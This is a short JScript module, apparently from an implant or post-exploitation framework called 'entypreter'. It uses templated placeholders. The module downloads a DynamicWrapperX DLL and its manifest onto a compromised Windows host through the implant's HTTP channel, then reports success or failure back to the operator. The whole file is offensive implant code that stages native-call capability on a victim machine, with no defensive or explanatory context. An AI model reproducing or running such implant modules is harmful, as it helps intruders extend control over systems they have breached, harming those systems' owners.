try
{
    entypreter.http.download("~DIRECTORY~/dynwrapx.dll", "~DLLUUID~");
    entypreter.http.download("~DIRECTORY~/dynwrapx.manifest", "~MANIFESTUUID~");

    entypreter.work.report("Success");
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
